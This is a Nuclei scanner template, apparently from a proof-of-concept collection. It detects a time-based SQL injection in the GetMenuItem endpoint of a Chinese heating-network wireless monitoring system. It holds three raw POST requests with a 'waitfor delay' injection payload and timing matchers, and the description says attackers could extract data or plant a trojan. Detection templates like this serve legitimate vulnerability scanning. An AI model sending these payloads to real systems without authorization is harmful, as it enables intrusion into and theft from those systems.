id: rewang-GetMenuItem-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 热网无线监测系统 GetMenuItem 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://github.com/wy876/POC/commit/3f0a45b0ae99cbabbc28e1dfb046e83e863e1026
  tags: tags
http:
  - raw:
      - |-
        POST /DataSrvs/UCCGSrv.asmx/GetMenuItem HTTP/1.1
        Host: {{Hostname}}
        accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        name=1') waitfor delay '0:0:3'-- +
      - |-
        POST /DataSrvs/UCCGSrv.asmx/GetMenuItem HTTP/1.1
        Host: {{Hostname}}
        accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        name=1') waitfor delay '0:0:6'-- +
      - |-
        POST /DataSrvs/UCCGSrv.asmx/GetMenuItem HTTP/1.1
        Host: {{Hostname}}
        accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        name=1') waitfor delay '0:0:9'-- +
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"